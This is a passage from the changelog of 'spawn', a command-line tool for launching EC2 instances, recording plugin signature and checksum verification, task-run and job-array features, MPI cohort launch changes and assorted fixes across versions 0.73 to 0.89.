  too). spawn now embeds a spore.host signing **public key**; when present, the
  generated bootstrap downloads a detached `.sig` and verifies it with `openssl`
  against that embedded key **before executing spored**, failing closed on a
  mismatch or missing signature. The trust root is the spawn binary (trusted via
  Homebrew/GitHub release), not the bucket. The release pipeline signs each spored
  binary with a KMS asymmetric key (`kms:Sign`; private key never leaves KMS).
  Until the key is provisioned, signing is skipped and the bootstrap stays in
  sha256-only mode with an honest log line — no false "verified" claim.

## [0.89.0] - 2026-07-21

### Added
- **Plugins can reference the instance login user via `{{ instance.login_user }}`.**
  A plugin's steps can now name the instance's login user (the `spawn:local-username`
  — the same user `as_user: true` steps run as) when writing a file it doesn't
  execute directly, e.g. a systemd unit's `User=` or a `chown` target, instead of
  hardcoding `ec2-user`. Falls back to `ec2-user` when the login user is unknown
  (older/untagged instances).

## [0.88.0] - 2026-07-20

### Changed
- **Signatures are now mandatory for official plugin releases** (spore-plugins#8).
  The deprecation window closed now that every official plugin is signed:
  installing an official `name@vX.Y.Z` whose release has no
  `manifest.json.sigstore.json` signature is a hard error instead of a warning.
  `--insecure` still downgrades it (and any other verification failure) to a
  warning for local dev. Unversioned/bare and third-party `github:` refs are
  unaffected.

## [0.87.0] - 2026-07-20

### Added
- **`spawn plugin validate --strict` enforces permission/step consistency**
  (spore-plugins#8). The strict mode cross-checks a plugin's declared
  `permissions:` block against its actual steps — e.g. `instance.root=false` must
  have no remote step that runs as root (a `run` step needs `as_user`, and
  fetch/extract always run as root), `instance.network=false` must have no fetch,
  `controller.network=false` no local network step — and requires a `permissions:`
  block to be present. The official registry's CI runs `--strict`, so a published
  plugin's declared capability surface is enforced at publish time rather than
  being merely decorative.
- **Installed-plugin provenance is recorded on the instance** (spore-plugins#8).
  A successful `spawn plugin install` now writes a `spore:plugin:<name>` EC2 tag
  (version, content-digest + commit prefixes, and the verification tier reached —
  `signature`/`manifest`/`none`) and persists the full resolved provenance into
  spored's on-instance plugin state, so an audit can answer "which plugin bytes
  are on this box, and how were they verified" from both the AWS control plane
  and the instance itself — not just the controller's local record. `spawn plugin
  status <name>` now shows a `Source:` line with the recorded provenance. Both
  writes are best-effort and never fail an already-completed install.

### Fixed
- **Clear error on a cosign legacy-bundle signature.** A plugin release signed
  without `--new-bundle-format` produces cosign's legacy bundle, which the
  verifier can't parse; it now reports that explicitly instead of a cryptic
  protobuf error (spore-plugins#8).

## [0.86.0] - 2026-07-20

### Added
- **Plugin `fetch` steps accept an optional `sha256:` checksum** (spore-plugins#8).
  When a `fetch` step declares `sha256:` (a 64-char lowercase hex digest), spored
  hashes the downloaded bytes and fails the install on a mismatch, removing the
  bad file — closing the "unverified transitive download" gap for a fetch URL
  that isn't itself covered by the plugin.yaml provenance digest. Optional in the
  spec (the registry's publish-time CI will require it on official plugins);
  `spawn plugin inspect` now shows whether each `fetch` step is checksummed.
- **Official plugin releases are verified against a checksum manifest** (spore-plugins#8).
  Installing `name@vX.Y.Z` from the official registry now resolves to the release
  tag `name-vX.Y.Z`, fetches `plugin.yaml` at that tag, and verifies its sha256
  against the `manifest.json` asset published on that GitHub Release — a missing
  manifest or a digest mismatch is a hard failure, so the bytes you install are
  provably the released ones. `spawn plugin inspect` shows `manifest-verified ✓`.
  New `spawn plugin manifest <plugin-dir>` generates the manifest (the registry's
  release workflow runs it; the same binary verifies it). A bare/unversioned or
  third-party `github:` ref has no manifest and is unaffected.
- **Official plugin release signatures are verified (cosign/sigstore keyless)**
  (spore-plugins#8). When an official release carries a `manifest.json.sigstore.json`
  signature, `spawn` verifies it by default: a Fulcio-issued certificate whose
  OIDC identity is pinned to the spore-plugins release workflow, with Rekor
  transparency-log inclusion and a trusted timestamp. A present-but-invalid
  signature (bad signature, wrong signing identity, missing log entry) is a hard
  failure; an *unsigned* release still installs with a warning during the
  deprecation window (integrity is still enforced via the checksum manifest).
  `--insecure` skips verification for local dev. `spawn plugin inspect` shows
  `signature-verified ✓`.

### Fixed
- **`spawn plugin install <name>` from the official registry now resolves the
  correct path.** The resolver fetched `…/<name>/plugin.yaml` but the registry
  stores plugins under `…/plugins/<name>/plugin.yaml`, so official installs
  404'd (only local `./path` and third-party `github:` refs worked). Official
  refs now use the `plugins/<name>/` layout.

## [0.85.0] - 2026-07-19

### Added
- **TaskSpec `resources.instance_type` pins the exact instance type** (spawn#413).
  When set, the sizer returns it verbatim and skips family/price selection —
  for adapters that expose a specific type (e.g. nf-spawn's `ext.instanceType`)
  rather than a cpu/memory request. Without it, a family-only hint like
  `t3.medium`→`families:[t3]` would size to the cheapest t3 (t3.nano), a
  regression for adapters that mean an exact type.

## [0.84.0] - 2026-07-19

### Added
- **TaskSpec gained `resources.s3_read_write` and a `placement` block** (spawn#386,
  for the workflow-adapter migration). `resources.s3_read_write` is a list of
  `s3://bucket[/prefix]` URIs the task's own tooling reads/writes/deletes/lists
  beyond the `inputs`/`outputs` manifests — the scoped instance profile now grants
  `ListBucket` + object `Get`/`Put`/`Delete` on those whole buckets (needed by
  Snakemake's S3 storage plugin, which does bucket-level listing). `placement`
  carries optional launch-time knobs: `ami`, `availability_zone`, attached EBS
  `volumes` (from snapshots, mounted at a path), `fsx_lustre_id`, and `efs_id` —
  mounted before the workload (the nf-spawn `ext.*` analogs). All optional; an
  empty placement is today's behavior. The headless launcher gained an
  `Options.StorageScript` hook to mount them.

### Changed
- **`spawn task run --wait -o json` now emits the CompletionRecord**, not the
  LaunchResult (spawn#386). Previously `--wait -o json` returned the launch info
  (instance id) and never the terminal record; the CompletionRecord was only
  reachable via `spawn task status <id> -o json`. Now a single
  `task run --wait -o json` launches, waits, and prints the full CompletionRecord
  (exit code, state, timings, logs), exiting with the task's exit code — the
  one-shot a workflow adapter wants. Without `--wait`, `-o json` still emits the
  LaunchResult (unchanged); human `--wait` output is unchanged.

## [0.83.1] - 2026-07-19

### Fixed
- **Auto-AMI now detects architecture authoritatively** (spawn#410). A plain
  `spawn launch` on a new Graviton family — e.g. `m9g.24xlarge` (Graviton5) —
  picked an x86_64 AMI and failed with `InvalidParameterValue: architecture
  'arm64' … does not match 'x86_64'`, because arch detection used a static
  allow-list of Graviton family prefixes that didn't include `m9g`.
  `GetRecommendedAMI` now resolves the architecture from EC2
  (`DescribeInstanceTypes` → `ProcessorInfo.SupportedArchitectures`), so any new
  arm64 family works with no code change; the static allow-list remains as an
  offline fallback (and gained `m9g`/`r9g`/`c9g`/`hpc7g`/`i8g`/… ).

## [0.83.0] - 2026-07-19

### Added
- **`spawn task run` container execution** (spawn#386, increment 3). A TaskSpec
  with a `container` image now runs the command *inside* that image instead of
  erroring. The generated wrapper installs Docker on demand, pulls the image, and
  runs the argv with the input/output manifest directories bind-mounted (identity
  mounts, so in-container paths match the spec); inputs/outputs still stage on the
  host, so the image needs no AWS CLI. Private-ECR images are authenticated with a
  `docker login` and get a scoped `ecr:ReadOnly` grant on the task's instance
  profile; public images pull anonymously. `resources.gpus > 0` passes `--gpus
  all`. The flagship `examples/task-spec.json` (a biocontainers image) now runs
  end-to-end.

## [0.82.0] - 2026-07-19

### Fixed
- **Task instances now self-terminate on completion / enforce their TTL in-instance**
  (spawn#406). `spawn task run` attaches a *scoped* IAM instance profile; that
  profile bypassed the code path that always grants spored its EC2
  self-management permissions, so spored got `AccessDenied` on `ec2:DescribeTags`
  and silently ran with `TTL=0` and no `on_complete` — the instance kept running
  until the out-of-band reaper caught it. A caller-supplied `InlinePolicyJSON`
  now always also carries the spored self-management baseline
  (DescribeTags/CreateTags/TerminateInstances/…), and `task run` tags the
  completion file explicitly. Verified end-to-end: a task instance self-terminates
  within minutes of completion.

### Added
- **Real `spawn task run`** (spawn#386, increment 2). `task run --spec <file>`
  now launches — not just `--dry-run`. It sizes the cheapest fitting instance,
  ensures the per-account results bucket exists, and launches an ephemeral
  instance running a generated wrapper that: stages inputs from S3
  (`aws s3 cp`), runs the command, stages outputs back, and writes a **durable
  completion record** to
  `s3://spawn-results-<account>-<region>/tasks/<task_id>/completion.json` (plus a
  `.exitcode` object and a best-effort `command.log`) — the signal workflow
  adapters poll. The instance self-terminates via TTL + `on_complete`. A scoped
  IAM instance profile grants exactly the input/output/results buckets the task
  touches (no wildcard). Spot launches fall back to on-demand once on a capacity
  error when `fallback: on_demand` is set. Returns immediately after launch;
  poll the completion record (a `--wait` poller and `spawn task status` are a
  follow-up). Container execution (`spec.container`) is deferred — it errors
  clearly for now; omit it to run on the host.

- **`spawn task status <task-id>`** (spawn#386, increment 2). Reads a task's
  durable completion record from
  `s3://spawn-results-<account>-<region>/tasks/<task-id>/completion.json` and
  prints it (`-o json` for the raw record). If the record isn't there yet the
  task is still running; `--check-complete` mirrors `spawn status` exit codes
  (0=completed, 1=failed, 2=running, 3=error) for scripting.
- **`spawn task run --wait`** blocks until the completion record appears (polling
  every `--poll-interval`, default 15s), prints it, and exits with the task's own
  exit code — for callers who want a synchronous run instead of polling.

### Changed
- `IAMRoleConfig` gained an `InlinePolicyJSON` field, letting callers attach a
  scoped inline policy from a string (no temp file). Used by `task run` to grant
  per-task S3 staging access.

## [0.81.0] - 2026-07-19

### Added
- **`spawn array logs <name> --index N`** (#389). Tail one array member's log by
  its (possibly sparse) job-array index: `--which command` (default,
  `/var/log/spawn-command.log`) or `--which spored` (`/var/log/spored.log`),
  `--lines N` (default 200). Reuses the status path's SSH-key-or-SSM exec branch,
  so it works on keyless (lagotto/cohort-launched) members over SSM. A missing
  index errors with a pointer to `spawn array status`.
- **`spawn array retry <name> --failed`** (#389). Relaunches only the indexes of
  a job array that have no running/pending member — the missing (`--min-viable`)
  gaps and any terminated/stopped members — regrouped under the original array.
  To relaunch faithfully (original AMI, subnet, security groups, user-data, TTL,
  and command — none of which a surviving member's tags fully carry), spawn now
  writes a **local launch record** at launch time to `~/.config/spore/arrays/`;
  `retry` reads it. This means retry must run from the machine that launched the
  array. It launches real, billable instances, so it prompts unless `--yes` is
  given; relaunched members inherit the original TTL.

### Changed
- Job arrays now persist a lightweight local launch record
  (`~/.config/spore/arrays/<array-id>.json`) at launch, powering
  `spawn array retry`. Best-effort — a write failure warns but never fails the
  launch. MPI clusters (all-or-nothing) are not recorded.

## [0.80.0] - 2026-07-19

### Added
- **Plugin install provenance / immutable pinning** (spore-plugins#8, increment 1).
  Resolving a plugin now records where it came from: the exact `plugin.yaml`
  sha256, and — best-effort via the GitHub commits API — the immutable commit SHA
  a tag/branch resolved to. `spawn plugin inspect` shows a `Resolved:` line
  (`commit <sha> · sha256 <hex>`, or "unpinned" when the commit can't be
  determined), `spawn plugin install` prints the pin and stores `commit_sha` +
  `spec_sha256` in the local install record for later audit. Commit resolution is
  best-effort — a rate-limited/offline GitHub API never blocks an install; the
  content digest is always recorded. (Signing, checksum manifests, and
  `fetch`-step digests remain later increments of the registry supply-chain RFC.)
- **Task-execution protocol foundation + `spawn task run --dry-run`** (#386,
  increment 1). New `pkg/taskproto` package defines the shared workflow-adapter
  contract (`TaskSpec`, `ResourceRequest`, input/output `Manifest`, `Lifecycle`,
  `TaskState`) with offline spec validation, plus a sizer that picks the cheapest
  instance type satisfying a resource request (via truffle) — including a
  multi-family allow-list and memory headroom that truffle's single-family filter
  lacks. `spawn task run --spec task.json --dry-run` parses, validates, sizes, and
  prints the plan (instance type, rate, TTL, est. max cost, staging manifests)
  **without launching anything**; real execution errors out pointing to
  `--dry-run`. Example at `examples/task-spec.json`. Real launch and the durable
  `.exitcode`-in-S3 completion record remain later increments (#386 stays open).
- **`spawn array` command group** (#389). First-class job-array reporting:
  `spawn array status <name>` shows launched-vs-requested members and, crucially,
  the **missing (sparse) indexes** a `--min-viable` partial launch leaves behind —
  the gap that silently breaks a dense-range shard scheme. `spawn array collect`
  reports per-index members, and `spawn array cancel [--pending]` terminates them
  (`--pending` spares actively-running members). Members are discovered by
  grouping EC2 on the job-array tags, so no server-side record is needed.
  (`logs` and `retry --failed` are intentionally not included yet — see #389;
  `retry` needs launch config that isn't fully recoverable from tags.)
- **`spawn task diagnose <name|id>`** (#391). A one-screen summary of a single
  instance — type/state/region/AZ, age, TTL, an on-the-fly compute-cost estimate
  (from the `spawn:price-per-hour` tag × age; labeled an estimate, 0 when
  unknown), job-array/sweep membership, a clearly-hedged likely-cause hint from
  state (terminated → TTL/Spot; stopped → idle), and pointers to the spored and
  command logs. Read-only and composes existing data (no SSH in the base path, so
  it works even when the instance is unreachable).
- **Parameter sweeps: native `grid:` (cartesian) expansion** (#390). A sweep
  param file can now declare `grid: {learning_rate: [...], batch_size: [...]}`
  and spawn expands it to one parameter set per combination — no more
  pre-generating the full `params` list with a script. `grid` and an explicit
  `params` list can be combined (explicit sets first). Keys expand in sorted
  order so the generated combinations, and the sweep index assigned to each, are
  deterministic. `--estimate-only` reflects the expanded instance count.
- **`spawn plugin inspect` and `spawn plugin install --dry-run`** (#387). Preview
  exactly what a plugin would do before installing it — resolved source and
  version, local (controller) vs remote (instance) steps, requested controller
  env, root vs login-user execution, downloads, health checks, cleanup steps, and
  the declared `permissions:` block — **without executing anything or contacting
  an instance**. Shows a trust banner (installing runs the author's code locally
  and, on the instance, as root) and flags unpinned / third-party sources.
  `inspect` doesn't require `--instance`.
- **Plugin `permissions:` declaration block** (#388). A `plugin.yaml` can now
  declare its capability surface — `controller` (env vars read, network, expected
  commands) and `instance` (root, network, ports opened, files managed) — as
  explicit metadata. `spawn plugin validate` checks it: env-var names must be
  valid, ports in range, and `controller.env` must cover everything in
  `local.env_passthrough` so the declaration can't understate what a plugin reads.
  This is declarative (ports/files inside opaque `run` steps still can't be
  inferred), and pairs with the upcoming `spawn plugin inspect` preview (#387).
- **Zenodo DOI**: spawn is archived on Zenodo with a citable DOI (concept DOI
  [10.5281/zenodo.21439888](https://doi.org/10.5281/zenodo.21439888), always
  latest). Added to `CITATION.cff` and a README badge.

### Fixed
- **`--cost-limit` no longer resets when an instance is stopped and resumed.**
  spored enforced the limit against only the *current* boot's uptime, so a job
  stopped and restarted several times could run well past its cost ceiling — each
  boot restarted the tally at $0. Enforcement now charges for **total** compute
  time across all starts (the same `spawn:compute-seconds` clock the daemon
  already persists), mirroring how the TTL uses an absolute deadline. Also aligned
  the `spored status` "Cost limit" line to report **compute-only** usage (it
  previously measured against compute **+ EBS**, which didn't match what actually
  triggers termination). The limit remains compute-only and terminates the
  instance; it fires independently of the TTL (first to fire wins).

## [0.79.0] - 2026-07-19

### Fixed
- **GPU instance types now auto-detect a working AMI** (#384). Auto-AMI pointed
  at `al2023-ami-kernel-default-gpu-{x86_64,arm64}` SSM parameters that **do not
  exist**, so every GPU launch without `--ami` failed with
  `SSM ParameterNotFound`. It now resolves the **Deep Learning Base OSS Nvidia
  Driver GPU AMI (AL2023)** via the `deeplearning` SSM namespace. Also fixed the
  GPU-family detection: `g6e`, `g7e`, `g7`, `g4dn`, `p4de`, `p5e`, `p6` were
  missing (newer families silently got a **CPU** AMI), and Neuron families
  (`inf*`/`trn*`) and AMD (`g4ad`) are no longer misclassified as NVIDIA GPUs.

### Added
- **Heterogeneous parameter sweeps: vary `instance_type` (and `ami`/`spot`) per
  entry** (#372). A `--param-file` sweep can now run the same workload across
  different instance families — the shape of a price-performance benchmark. spawn
  detects an **arch/GPU-appropriate AMI per entry** (arm64 for `c8g`, GPU for
  `g6`, x86 for `c8i`/`c8a`), memoized so entries sharing an architecture reuse
  one lookup; entries may still set an explicit `ami:`. An entry that omits
  `instance_type` falls back to the top-level `--instance-type`. A sweep must be
  all-Linux or all-Windows (a mixed-OS sweep is rejected before launch).
  Previously the whole sweep used the first entry's AMI, so arm64/GPU entries got
  an x86 non-GPU image and failed to boot. (Detached/Lambda sweeps use each
  entry's explicit `ami:` and do not auto-detect.)
- **`CITATION.cff`** — machine-readable citation metadata so the repo is citable
  (GitHub "Cite this repository"); base for Zenodo DOI minting.

## [0.78.0] - 2026-07-19

### Added
- **Command/flag reference is now generated from the CLI and drift-gated.** A
  hidden `spawn gen-docs` command (via `libs/docgen`) emits the exhaustive
  per-command reference to `docs-gen/`; `make gen-docs` regenerates it and a CI
  `check-docs` gate fails if the committed reference drifts from the code. The
  docs site vendors these fragments, so the reference can no longer go stale
  (fixes a class of doc-vs-code drift found in the 2026-07 docs audit). Run
  `make gen-docs` after adding/renaming/removing a command or flag.

### Changed
- **spawn now uses your existing default SSH key when you have one.** If
  `~/.ssh/id_ed25519` (or `~/.ssh/id_rsa` for Windows/RSA targets) exists, spawn
  imports that public key and you connect with the key you already use, instead of
  always minting a separate managed key. Only when you have no default key does it
  fall back to generating one under `~/.spawn/keys/`. (The instance still creates a
  Linux user matching your local username, so `spawn connect` logs you in as you.)

### Fixed
- **Generated reference no longer breaks the docs build on `<placeholder>` or
  `{{ }}` tokens.** Bumped `libs/docgen` to v0.43.2, which HTML-escapes bare `<…>`
  and Vue `{{ … }}` in descriptions and examples (e.g. `<sweep-id>`, the
  `{{ config.X }}` plugin note), so the VitePress site (which parses markdown
  through Vue) renders the reference instead of failing to compile or render.
- **`spawn connect <id> -- <cmd>...` no longer mangles multi-token commands** (#369).
  The post-`--` argument vector was space-joined into one string and re-wrapped in
  `bash -c '...'`, so `-- bash -lc "echo a && echo b"` reached the remote as
  `bash -c 'bash -lc echo a && echo b'` and failed with `bash: -c: option requires
  an argument`. Each argument is now shell-quoted individually and passed through
  verbatim, matching plain `ssh host <argv...>`, so quoted scripts, pipes, and
  `&&` work.

### Changed
- **MPI clusters now have a real readiness barrier.** Before a cluster is
  considered ready, each node is probed over SSM for `mpirun` (unless
  `--skip-mpi-install`) and, when `--efa` is set, the EFA fabric provider
  (`fi_info -p efa`) — so "ready" means MPI-capable, not merely "running". A node
  that never becomes MPI-ready fails the launch (and the cluster is cleaned up).
- **MPI peer discovery is now control-plane, over SSM.** After the all-or-nothing
  barrier, spawn collects every node's private IP and pushes
  `/etc/spawn/job-array-peers.json` to all nodes via SSM (the file the MPI
  user-data waits on to build its hostfile), instead of each instance
  self-discovering peers from EC2. Benefits: the hostfile now uses **private IPs**
  (correct for intra-VPC / EFA rank-to-rank traffic) and peers arrive as soon as
  the cluster is up. If the push fails on any node the launch fails and the whole
  cluster is drained (no orphaned billing). Requires SSM on the instances —
  guaranteed since the SSM-baseline change above. spored no longer writes the
  peers file for MPI.
- **All job-array launches (`--count > 1`) now run through the cohort engine;
  the legacy goroutine loop is removed.** Both MPI (`--mpi`) and plain arrays get
  the cohort barrier, leak-free drain, and AZ capacity fallback. MPI is
  all-or-nothing (a missing rank makes the cluster useless); plain arrays are
  independent by default.
- **MPI placement groups are now created per-AZ, on demand — so AZ fallback works
  with a cluster placement group.** Previously the auto placement group was
  created up front in one AZ, which is incompatible with moving the cohort to
  another AZ on capacity exhaustion (a cluster PG is AZ-bound). The cohort now
  creates a fresh `spawn-mpi-<name>-<az>` group as it enters each AZ and cleans up
  the ones for abandoned AZs afterward. AZ fallback is therefore enabled for
  auto-placement-group MPI launches; an explicit `--placement-group` stays fixed
  to a single AZ (no fallback), since it's user-managed.

### Added
- **`--min-viable` for plain job arrays** (default `1`): the minimum number of
  members that must launch for the array to succeed. Default `1` makes members
  independent — one member's terminal failure no longer tears down the rest (an
  improvement over the old all-or-nothing loop). Set it equal to `--count` for
  strict all-or-nothing. Ignored for `--mpi` (always all-or-nothing).
- **MPI/job-array cohort launches now fall back across Availability Zones on
  capacity exhaustion.** When the primary AZ has no capacity
  (`InsufficientInstanceCapacity`), the whole cohort advances to the next AZ **as
  a unit** — every node lands in the same surviving AZ, preserving the
  placement-group/one-AZ invariant (a per-node fallback would scatter ranks
  across zones). The chain is the region's AZs (operator-selected AZ first),
  capped at 4. New `DescribeAvailabilityZones` AWS helper. This stage only enables
  the chain when no cluster placement group is set; combining AZ fallback with a
  placement group lands in a follow-up.

### Removed
- **`--reconciler` is removed.** It was a hidden, experimental flag for opting a
  job-array launch into the cohort engine; job arrays now always use cohort, so
  the flag no longer exists (it was a warn-only no-op in the interim).

### Changed
- **SSM is now guaranteed on every spawn-launched instance.** `AmazonSSMManagedInstanceCore`
  is attached to the instance role on all profile paths — the default `spored`
  role and user-supplied `--iam-role`/policy roles alike — and a failure to attach
  it is now a hard error instead of a logged warning. This makes `spawn connect`'s
  SSM fallback reliable everywhere and is the baseline that the MPI cohort's
  control-plane peer assembly and readiness probes depend on. (Instances launched
  in batch-queue mode with a pre-existing `--iam-role` profile name are unchanged —
  that profile is used as-is; ensure it carries SSM core yourself.)

### Added
- **`bot-cross-account-role.yaml`: opt-in per-account ExternalId and tag-scoped
  EC2 permissions.** Two new, default-off parameters let each account harden its
  cross-account bot role without breaking existing deployments (spore-host#374):
  - `ExternalId` — set it to the per-account high-entropy value `spawn bot
    register` now returns (`external_id`) instead of the shared `spawn-bot`.
    Empty keeps the legacy value, which the Lambda still falls back to.
  - `ScopeStartStopByTag` — when `true`, `ec2:StartInstances`/`StopInstances`
    are restricted to `<prefix>:managed=true` instances instead of `Resource
    "*"`.
  Re-deploying the stack with defaults reproduces the previous behavior exactly;
  removing the code-side static-ExternalId fallback remains gated on all customer
  roles adopting a per-account value.

## [0.77.0] - 2026-07-17

### Added
- **Shared spore.host config base.** spawn now honors the suite-wide
  `libs/sporeconfig` settings: new persistent `--profile`, `--region`, and
  `--account` flags, the `SPORE_PROFILE`/`SPORE_REGION`/`SPORE_ACCOUNT` env vars,
  and the `[spore]` table of `~/.config/spore/config.toml`, resolved
  flag > env > file > default. The resolved profile/region flow into the base AWS
  client (`pkg/aws.NewClient`), so commands that previously used only the ambient
  chain now respect a suite-wide profile/region. Unset = unchanged (ambient AWS
  chain); spawn's `spore-host-infra`/`spore-host-dev` two-account split is
  preserved and layers on top (it falls through to the shared profile only when
  `SPAWN_INFRA_PROFILE`/`SPAWN_COMPUTE_PROFILE` is explicitly cleared). spawn also
  still reads `~/.spawn/config.yaml` for its own sections.

### Security
- **Wildcard `*:FullAccess` IAM templates now require explicit opt-in** (#175).
  `--iam-policy s3:FullAccess` / `dynamodb:FullAccess` / `sqs:FullAccess` grant a
  service wildcard on all resources to the instance role; requesting one now
  errors unless you also pass `--iam-allow-full-access`, steering toward the
  scoped `:ReadOnly`/`:WriteOnly` variants by default. Unknown template names are
  also rejected up front instead of silently ignored.

### Changed
- **`spawn launch --no-timeout` now requires confirmation** (#175). Disabling the
  automatic idle/TTL guardrails is a real cost/zombie risk, so it now prompts
  (bypass with `-y`/`--yes`) and aborts if declined, rather than only printing a
  warning. The zombie-instance guard (auto 1h idle default) was also de-duplicated
  into a single shared helper across the single/batch-queue/sweep launch paths.
- Internal: `pkg/agent` now runs under the race detector in CI (`make test-race`),
  locking in the `Agent.config` mutex fix (#175).

### Removed
- **`pkg/sms` is removed** (#293). It had no importers inside spawn; its
  inbound-reply types (`PendingKey`/`PendingNotification`/`PendingTable`) were
  used only by `spore-host/lambda/rest-api`, which now keeps its own local copies,
  and its outbound helpers (`Send`/`StorePending`/`BuildMessage`/`ProjectNumber`)
  were unused everywhere (the spore-bot lambda already carries its own copy).
  Consumers pinned to an older spawn are unaffected; nothing else in spawn used it.

## [0.76.0] - 2026-07-15

### Changed
- **CLI consistency (2026-07 audit, Wave 2).** Several commands and flags were
  standardized for consistency; every old form keeps working as a hidden
  deprecated alias, so nothing breaks:
  - `spawn fsx show` and `spawn schedule show` are the canonical single-resource
    detail verbs (were `fsx info` / `schedule describe`, kept as aliases) (#304).
  - `spawn autoscale set-scaling-policy` pairs symmetrically with
    `set-metric-policy` (was `set-policy`, kept as an alias) (#307).
  - `spawn cost <sweep-id>` shows the breakdown directly; `spawn cost breakdown
    <sweep-id>` still works (hidden) (#308).
  - Idle action is now the `--on-idle=stop|hibernate` enum on `spawn launch`,
    mirroring `--on-complete`; `--hibernate-on-idle` is deprecated (#316).
  - `spawn image import --wait` is now a boolean like `launch`/`ami create`/
    `pipeline launch`, with a new `--wait-timeout` (minutes, default 60) for the
    bounded wait it used to encode in `--wait=N` (#317).
- **`spawn cleanup` and `spawn notify workspace destroy` now execute by default
  and take `--dry-run` to preview** (was: preview by default, `--force` /
  `--confirm` to execute). Both prompt for confirmation first (skip with `--yes`),
  so the destructive action is still gated. `--force` / `--confirm` remain as
  deprecated no-op-ish aliases (#315).

### Deprecated
- `fsx info` → `fsx show`; `schedule describe` → `schedule show`;
  `autoscale set-policy` → `autoscale set-scaling-policy`;
  `cost breakdown <id>` → `cost <id>`; `launch --hibernate-on-idle` →
  `launch --on-idle hibernate`; `upgrade-spored --force` →
  `upgrade-spored --allow-downgrade`; `cleanup --force` and
  `notify workspace destroy --confirm` (execute is now the default). All still
  function; each prints a deprecation notice (#304/#307/#308/#315/#316).

### Changed (internal refactors — no behavior change)
- Internal: the 17 inline `sts.NewFromConfig(...).GetCallerIdentity(...)` call
  sites in `cmd/` now go through the existing `pkg/aws` helpers
  (`GetAccountID` / `GetCallerIdentityInfo`), which also add an IMDS fallback when
  STS is unavailable (#302). Each site keeps its original AWS config (caller/infra
  vs compute account), so behavior is unchanged; the `cmd/` aws-sdk-import
  allowlist (#327) was tightened to drop `sts` accordingly.
- Internal: the four non-interactive `spored`-over-SSH call sites (`status`,
  `config`, `extend`, `queue`) now share a single `sporedSSHOptions()` helper for
  their common SSH `-o` block instead of repeating it (#303). No behavior change;
  the interactive `connect` and launch/plugin SSH paths keep their own distinct
  options.
- Internal: collapsed the ~40 repeated per-region client-construction sites in
  `pkg/aws` behind two helpers — `c.regionalEC2(region)` and
  `c.regionalConfig(region)` — replacing the copy-pasted
  `cfg := c.cfg.Copy(); cfg.Region = region; ec2.NewFromConfig(cfg)` idiom, and
  retired the old `getRegionalConfig` (whose returned error was always nil, so its
  callers carried dead error branches) (#297). No behavior change.
- Internal: finished the `pkg/aws` file split (#325) by moving the last two
  non-core helpers out of the oversized `client.go` — `GetEFSDNSName` → `efs.go`
  and `LookupEC2OnDemandPrice` (with its region→pricing-location map) → `pricing.go`.
  No behavior or API change; `client.go` is now a cohesive client/launch/lifecycle
  core.

## [0.75.0] - 2026-07-15

### Added
- New dependency-free leaf package **`pkg/launchererr`** holding the
  `ErrPostLaunch` sentinel (imports only the standard library, no AWS SDK).
  `launcher.ErrPostLaunch` is now an alias of it, so `errors.Is` and every
  existing caller are unchanged — but a downstream that only needs to classify a
  launch error (e.g. a capacity-retry loop) can match a post-launch failure via
  `errors.Is(err, launchererr.ErrPostLaunch)` without importing the launcher's
  AWS SDK dependency tree (#354).

## [0.74.0] - 2026-07-15

### Added
- `aws.LaunchResult` now carries `Region` (the region the instance launched into)
  and `LaunchTime` (the server-authoritative launch timestamp from RunInstances).
  Library consumers measuring launch→terminate cost windows no longer have to
  timestamp with their own wall-clock or thread the region separately (#351).

## [0.73.0] - 2026-07-14

### Added
- **Plugin remote steps can declare `as_user: true`** to run as the instance's
  local login user instead of root. spored runs plugin steps as root, but some
  tools refuse that — notably Globus Connect Personal, which aborts with
  "Running Globus Connect Personal as root is not supported" and stores its
  config under the user's `~/.globusonline`. A step with `as_user` runs via a
  login shell as the `spawn:local-username` user (reusing the pre-stop
  run-as-user mechanism); if the instance has no known local user it falls back
  to root with a warning. The `globus-personal-endpoint` plugin's setup/start/
  status/stop steps use it (verified live: endpoint registers, connects, and
  transfers data bidirectionally).
- **Plugins can declare `local.env_passthrough`** — a list of controller
  environment variables their local steps are allowed to read. Local steps run
  with a deliberately minimal environment (so plugin scripts can't scoop up the
  caller's AWS or other credentials); a plugin that legitimately needs a
  controller-side secret (e.g. Tailscale's `TS_API_CLIENT_SECRET` to mint an auth
  key) opts in by name, and spawn injects only those variables. Also fixes an
  inconsistency where local conditions saw the full environment but local
  provision did not.
- **`spawn plugin install` and `spawn start` configure a per-instance SSH
  identity** for plugins with SSH-based local steps. Tools like `mutagen` shell
  out to the system `ssh` and have no key flag, so spawn writes an `IdentityFile`
  block for the instance's IP into a managed include (`~/.spawn/ssh_config`,
  referenced by an `Include` added to `~/.ssh/config`) using the resolved launch
  key (`--key`, or the instance's key pair — the same lookup `spawn connect`
  uses). Unlike loading the key into `ssh-agent`, an `ssh_config` `IdentityFile`
  is honored by every `ssh` regardless of which agent `IdentityAgent` points at
  (e.g. a read-only 1Password agent), and `IdentitiesOnly yes` avoids offering
  other keys first. The block is re-pointed on `spawn start` (new IP) and removed
  on `spawn plugin remove` / `spawn terminate` — including for plugins that have
  no deprovision record (e.g. `tailscale`), so a stale `Host` entry never leaks.
- **Plugins can declare a `local.reconcile` block, run on `spawn start`.** When a
  stopped instance is started it gets a new public IP, which an IP-bound local
  footprint (e.g. `spore-sync`'s mutagen session, pinned to the old address)
  can't follow on its own. A plugin that needs re-pointing declares reconcile
  steps; `spawn start` replays them with the new `{{ instance.ip }}` (retrying
  while SSH comes up) for any such plugin recorded for that instance. Plugins
  whose footprint isn't address-bound omit the block.

### Changed
- **`spawn stop` now confirms before stopping.** It prompts for confirmation
  (skippable with `-y`/`--yes`), matching `spawn terminate`. Stopping an instance
  interrupts running work and any live plugin sessions, so it should not be a
  silent one-keystroke action.
- **`spawn plugin install` now runs a plugin's full lifecycle end-to-end.**
  Previously the command ran only a plugin's local provision steps on the
  controller and never triggered the remote `install`/`configure`/`start` steps
  on the instance — so remote-only plugins (e.g. `tailscale`) were inert and
  plugins split across both halves (e.g. `globus`) could never complete. The
  command now runs local provision on the controller, then hands the resolved
  spec, config, and any pushed values to `spored` (via a new authenticated
  `POST /v1/plugins/install` endpoint over the SSH tunnel) which runs the remote
  half; the CLI polls until the plugin is running or reports the failure. Values
  captured and pushed by local steps are delivered *before* the remote configure
  phase, so `{{ pushed.<key> }}` resolves without the plugin parking to wait.
  Requires SSH access to the instance (as `spawn plugin status` already does).
- **`spawn plugin install` now populates `instance.ip` for local provision
  steps.** The controller-side template context previously only exposed
  `instance.id` and `instance.name`; plugins whose local steps reach the
